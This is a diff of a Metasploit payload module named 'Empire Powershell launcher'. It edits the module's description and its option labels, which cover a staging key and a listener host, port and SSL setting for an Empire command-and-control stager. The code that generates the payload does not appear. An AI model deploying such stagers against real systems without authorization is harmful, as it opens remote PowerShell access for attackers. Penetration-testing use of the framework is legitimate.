@@ -1,6 +1,5 @@
 ##
 # This module requires Metasploit: https://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core/payload/windows/exec_x64'
@@ -10,7 +9,7 @@ require 'msf/core/handler/reverse_tcp_ssl'
 
 ###
 #
-# Extends the Exec payload to add a new user.
+# Empire stager payload.
 #
 ###
 module MetasploitModule
@@ -24,7 +23,7 @@ module MetasploitModule
   def initialize(info = {})
     super(update_info(info,
       'Name'          => 'Empire Powershell launcher',
-      'Description'   => 'Listen for a connection and spawn an interactive powershell session',
+      'Description'   => 'Gererate an Empire PowerShell custom stager',
       'Author'        => '\@b4rtic',
       'License'       => MSF_LICENSE,
       'Platform'      => 'win',
@@ -34,10 +33,10 @@ module MetasploitModule
     # Register command execution options
     register_options(
       [
-        OptString.new('STAGINGKEY', [ true, "StagingKey for Empire listner", nil ]),
-        OptAddress.new('LHOST', [ true, "Host for Empire listner", nil ]),
-        OptPort.new('LPORT', [ true, "Port for Empire listner", nil ]),
-        OptBool.new('SSL', [ true, "Enable ssl for Empire listner", false ])
+        OptString.new('STAGINGKEY', [ true, "StagingKey of Empire listner", nil ]),
+        OptAddress.new('LHOST', [ true, "Host of Empire listner", nil ]),
+        OptPort.new('LPORT', [ true, "Port of Empire listner", nil ]),
+        OptBool.new('SSL', [ true, "Enable ssl for Empire Stager", false ])
       ])
     # Hide the CMD option...this is kinda ugly
     deregister_options('CMD')
